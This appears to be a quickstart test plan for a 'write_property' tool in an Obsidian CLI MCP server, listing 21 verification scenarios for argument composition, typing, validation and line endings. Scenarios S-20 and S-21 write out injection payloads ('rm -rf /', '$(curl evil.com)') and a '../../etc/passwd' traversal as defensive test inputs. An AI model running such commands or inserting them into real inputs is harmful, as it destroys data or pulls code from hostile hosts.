# Quickstart — Write Property verification

21 verification scenarios mapped 1:1 against spec.md's SC-001..SC-021. Each scenario is a self-contained check the implementer can run during T0 of `/speckit-implement`, the integration sweep, or a manual smoke pass.

Scenarios S-1..S-17 run in vitest CI against stub `spawnFn` injections; S-18..S-21 are manual end-to-end checks against the authorised test vault (`TestVault-Obsidian-CLI-MCP` per [.memory/test-execution-instructions.md](../../.memory/test-execution-instructions.md)) and/or MCP Inspector / Claude Desktop.

## S-1 — Text write round-trips with `type: "text"` (SC-001)

**Setup**: stub `spawnFn` recording invocations. Input `{ target_mode: "specific", vault: "Demo", path: "x.md", name: "status", value: "shipped" }`. Stub responds to property:set with exit 0 and `Set status: shipped\n` stdout.

**Assertion**: spawn called once with `["property:set", "vault=Demo", "path=x.md", "name=status", "value=shipped"]` (no `type=` — inferred-as-text per FR-008). Response equals `{ written: true, path: "x.md", name: "status" }`.

## S-2 — List write joins to comma-separated argv with `type: "list"` (SC-002)

**Setup**: input `{ ..., name: "tags", value: ["alpha", "beta"] }`.

**Assertion**: spawn called once with argv that includes `"value=alpha,beta"` AND `"type=list"`. Response `{ written: true, path, name: "tags" }`.

## S-3 — Number write emits bare numeric (SC-003)

**Setup**: input `{ ..., name: "count", value: 7 }`.

**Assertion**: argv includes `"value=7"` AND `"type=number"`. Response `{ written: true, path, name: "count" }`.

## S-4 — Boolean write emits YAML boolean (SC-004)

**Setup**: input `{ ..., name: "archived", value: true }`.

**Assertion**: argv includes `"value=true"` AND `"type=checkbox"`. Response `{ written: true, path, name: "archived" }`.

## S-5 — Date write with explicit type (SC-005, date branch)

**Setup**: input `{ ..., name: "due", value: "2026-12-31", type: "date" }`.

**Assertion**: argv includes `"value=2026-12-31"` AND `"type=date"`. Response `{ written: true, path, name: "due" }`.

## S-6 — Datetime write with explicit type (SC-005, datetime branch)

**Setup**: input `{ ..., name: "updated", value: "2026-05-10T14:30:00", type: "datetime" }`.

**Assertion**: argv includes `"value=2026-05-10T14:30:00"` AND `"type=datetime"`. Response `{ written: true, path, name: "updated" }`.

## S-7 — Three outcome cases for FR-013 / FR-014 / FR-015 (SC-006)

Three sub-scenarios per the SC-006 enumeration:
- **S-7a Add new key** — file has frontmatter without `status`; write `name: "status", value: "shipped"`. Stub responds with `Set status: shipped`. The wrapper does not need to know the file state; the spawn's argv is identical regardless of pre-state. Verified at the spawn-call layer; on-disk verification deferred to S-18 / S-19 manual run.
- **S-7b Overwrite existing key** — same as S-7a; the CLI handles overwrite natively.
- **S-7c No-frontmatter file** — same. The CLI handles FM-block insertion natively.

## S-8 — Non-existent file → CLI_REPORTED_ERROR (SC-007)

**Setup**: input `{ ..., path: "missing.md", name: "foo", value: "bar" }`. Stub responds with exit 0 and stdout `Error: File "missing.md" not found.\n`.

**Assertion**: handler throws `UpstreamError({ code: "CLI_REPORTED_ERROR" })`. Spawn called once (no auto-create attempt).

## S-9 — Validation rejects malformed inputs without spawning (SC-008)

Twelve sub-scenarios, one per US3 acceptance scenario. For each:
- Compose the malformed input shape.
- Call `write_property` via the registered tool's handler.
- Assert the response shape is `isError: true` with `code: "VALIDATION_ERROR"`.
- Assert the stub `spawnFn` was NEVER invoked (`.mock.calls.length === 0`).

## S-10 — Type-vs-value contradiction → structured error, file unchanged (SC-009)

**Setup**: input `{ ..., name: "count", value: "abc", type: "number" }`. Stub responds with `Error: Invalid number: abc\n` (per F4).

**Assertion**: handler throws `UpstreamError({ code: "CLI_REPORTED_ERROR" })`. Spawn argv includes both `"value=abc"` AND `"type=number"` (the wrapper forwards both; the CLI is the rejection layer).

## S-11 — Empty list writes valid empty YAML list (SC-010)

**Setup**: input `{ ..., name: "tags", value: [] }`.

**Assertion**: argv includes the literal `"value=[]"` (NOT `"value="`) AND `"type=list"`. Per F2 the CLI produces `tags: []` on disk; on-disk verification deferred to S-18 manual run.

## S-12 — YAML control character round-trip (SC-011)

**Setup**: input `{ ..., name: "note", value: "hello # world" }`.

**Assertion**: argv includes `"value=hello # world"` (raw, no wrapper-side quoting). The CLI auto-quotes per F9. On-disk round-trip verification deferred to S-19 manual run.

## S-13 — Line endings: LF preserved; CRLF partial preserved (SC-012, amended per R8)

Two sub-scenarios:
- **S-13a all-LF file**: pre-write LF only; post-write asserted LF only. Verified via byte-stream inspection in the manual S-19 run.
- **S-13b CRLF file**: pre-write CRLF only; post-write asserted to have CRLF in the unmodified body region BUT LF in the modified frontmatter region (per R8 amendment). The realised contract is "all-LF round-trips cleanly; CRLF is partial".

This SC is locked at unit-test level by validating the CLI argv composition; the realised line-ending behaviour is a CLI property tested in the manual run.

## S-14 — No existing typed-tool surface changes (SC-013)

**Setup**: run the full vitest test suite from `main` (before integrating the new tool) vs the feature branch.

**Assertion**: every existing typed tool's test file passes byte-stable. The only edits to `src/server.ts` are the import line and the tools-array entry (alphabetical between `createReadPropertyTool` and `createWriteNoteTool`).

## S-15 — Documentation completeness (SC-014)

**Setup**: read `docs/tools/write_property.md` after publish.

**Assertion**: file contains (a) per-field input contract for all seven fields, (b) the type-inference rules (boolean → checkbox / number → number / string[] → list / string → text), (c) the date/datetime explicit-type requirement, (d) the output shape, (e) the failure-mode roster (every code from contracts/write-property-input.contract.md), (f) ≥4 worked examples covering ≥4 of the six YAML types.

## S-16 — Regression-test count floor (SC-015)

**Setup**: count tests in the three new test files.

**Assertion**: `schema.test.ts` ≥ 17 cases, `handler.test.ts` ≥ 35 cases, `index.test.ts` ≥ 5 cases. Total ≥ 57 (post-/speckit-analyze remediation; was 54 pre-remediation), vs SC-015's floor of 30.

## S-17 — Zero new error codes (SC-016)

**Setup**: diff `src/errors.ts` between `main` and the feature branch.

**Assertion**: the diff is empty. The `code` field of `UpstreamError` continues to admit only the codes already enumerated; no new code added by this feature.

## S-18 — Live-CLI characterisation pass (SC-017)

**Setup**: against `TestVault-Obsidian-CLI-MCP` with Sandbox/ subdirectory seeded with fixtures per [.memory/test-execution-instructions.md](../../.memory/test-execution-instructions.md). Run each FR-030 enumerated case as a `& obsidian vault=… property:set …` probe.

**Assertion**: each probe's observed behaviour matches the F1..F15 findings in research.md. Findings are persisted under `specs/018-write-property/research.md`. One case deferred to T0 of /speckit-implement: two concurrent writes to the same file — the orchestrated parallel probe runs inside the test suite's own concurrency framework, not via ad-hoc CLI invocations.

## S-19 — Token-saving smoke check (SC-018)

**Setup**: a real `write_property` call against a real vault note with a 50-line frontmatter block and a 5,000-char body.

**Assertion**: response payload (JSON-serialised `{ written: true, path, name }`) is ≤ ~150 characters. Compare to the read_note + write_note round-trip alternative which would round-trip the full 5,000+50-line content; the savings is observable from any tracing layer that records request/response sizes.

## S-20 — Argv-passing structural anti-injection (SC-019)

**Setup**: inputs with adversarial `name` (`"name=foo; rm -rf /"`) and `value` (`"value=$(curl evil.com)"`).

**Assertion**: spawn's argv contains discrete entries `"name=name=foo; rm -rf /"` and `"value=value=$(curl evil.com)"` — the cli-adapter prepends the parameter name to the value via `=`, no shell interpolation, no command substitution. The CLI on the receiving end treats the entire string as a single argv parameter; no shell command runs.

## S-21 — Path-traversal CLI-confined (SC-020)

**Setup**: input `{ ..., path: "../../etc/passwd" }`. Stub responds with `Error: File "../../etc/passwd" not found.\n`.

**Assertion**: handler throws `UpstreamError({ code: "CLI_REPORTED_ERROR" })`. NO file is created at `/etc/passwd` (verified by checking the FS post-call in the manual S-19 run; in CI, the stub's lack of FS access guarantees no on-disk effect).

## SC-021 — Cross-type retype (additional gate from clarification)

**Setup**: three sub-scenarios mirroring SC-021's enumeration (number → text, text → number, list → text):
- **a** — pre-state `count: 7` (number). Write `name: "count", value: "abc"`. Post-state `count: "abc"` (text).
- **b** — pre-state `tag: "hello"` (text). Write `name: "tag", value: 42, type: "number"`. Post-state `tag: 42` (number).
- **c** — pre-state `tags: ["a", "b"]` (list). Write `name: "tags", value: "scalar"`. Post-state `tags: "scalar"` (text).

For each, run a `property:read` post-write and assert the returned `type` label matches the new resolved type. Verifies FR-033 round-trip through the CLI. Tested in unit suite via stub responses; live verification in S-18.

## Test execution gates

Before invoking S-18 / S-19 / S-20 (live-CLI runs):
1. Read [.memory/test-execution-instructions.md](../../.memory/test-execution-instructions.md).
2. Confirm the focused Obsidian instance is targeting `TestVault-Obsidian-CLI-MCP` (the active-mode probes write to whatever file Obsidian has focused — if a non-Sandbox file is focused, the probe will land there per F8).
3. Run probes from a Sandbox/ subdirectory with timestamped fixtures.
4. Clean up Sandbox/ after the run; leave the rest of the vault untouched.

S-18 in particular reuses the F1..F15 fixtures and observations captured at plan stage — re-running the same probes verifies the CLI behaviour has not drifted between plan and implementation.
